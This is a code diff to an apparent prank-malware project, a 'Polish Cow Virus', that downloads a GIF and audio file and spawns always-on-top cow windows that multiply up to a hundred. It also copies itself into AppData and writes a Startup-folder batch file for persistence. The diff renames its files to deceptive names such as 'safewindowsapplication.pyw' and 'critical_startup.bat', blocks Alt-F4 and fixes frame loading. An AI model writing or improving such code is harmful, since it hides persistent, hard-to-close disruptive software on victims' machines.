@@ -5,7 +5,7 @@ import shutil
 import random
 
 folder = os.path.dirname(os.path.abspath(__file__))
-cow_path = os.path.join(folder, "cow.pyw")
+cow_path = os.path.join(folder, "safewindowsapplication.pyw")
 
 cow_code = r'''
 import tkinter as tk
@@ -17,8 +17,8 @@ import urllib.request
 
 folder = os.path.dirname(os.path.abspath(__file__))
 
-gif_path = os.path.join(folder, "dancing.gif")
-mp3_path = os.path.join(folder, "pol.mp3")
+gif_path = os.path.join(folder, "processingsystems.gif")
+mp3_path = os.path.join(folder, "audiosystems.mp3")
 
 gif_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/dancing.gif"
 mp3_url = "https://github.com/eggman1243/Polish-Cow-Virus/raw/refs/heads/main/pol.mp3"
@@ -45,20 +45,22 @@ except Exception as e:
 
 
 cows = []
+frames = []
 max_cows = 100
 
 
-def load_frames():
+def load_frames(root):
     frames = []
 
     try:
         gif = Image.open(gif_path)
+        frame_index = 0
 
         while True:
+            gif.seek(frame_index)
             frame = gif.copy().convert("RGBA")
-            frames.append(ImageTk.PhotoImage(frame))
-
-            gif.seek(len(frames))
+            frames.append(ImageTk.PhotoImage(frame, master=root))
+            frame_index += 1
 
     except EOFError:
         pass
@@ -68,7 +70,25 @@ def load_frames():
     return frames
 
 
-frames = load_frames()
+root = tk.Tk()
+root.withdraw()
+
+root.after(0, lambda: None)
+root.update_idletasks()
+root.update()
+
+def init():
+    global frames
+    frames = load_frames(root)
+
+    if not frames:
+        print("Failed to load GIF")
+        return
+
+    create_cow()
+    animate()
+    keep_top()
+    root.after(10000, duplicate)
 
 
 def create_cow():
@@ -82,6 +102,7 @@ def create_cow():
     window.title("")
     window.resizable(False, False)
     window.overrideredirect(True)
+    window.bind("<Alt-F4>", lambda e: "break")
     window.attributes("-topmost", True)
 
     screen_w = window.winfo_screenwidth()
@@ -142,16 +163,8 @@ def keep_top():
     root.after(1000, keep_top)
 
 
-root = tk.Tk()
-root.withdraw()
 
-create_cow()
-
-animate()
-keep_top()
-
-root.after(10000, duplicate)
-
+root.after(100, init)
 root.mainloop()
 '''
 
@@ -177,7 +190,7 @@ if existing_folders:
 
     local_cow = os.path.join(
         target_folder,
-        "cow.pyw"
+        "safewindowsapplication.pyw"
     )
 
     shutil.copy(cow_path, local_cow)
@@ -189,13 +202,13 @@ if existing_folders:
 
     bat_path = os.path.join(
         startup_folder,
-        "cow_startup.bat"
+        "critical_startup.bat"
     )
 
     with open(bat_path, "w") as f:
         f.write(f'@echo off\n"{sys.executable}" "{local_cow}"')
 
-    print("cow.pyw added to startup!")
+    print("safewindowsapplication.pyw added to startup!")
 else:
     print("No AppData Local folders found!")
 
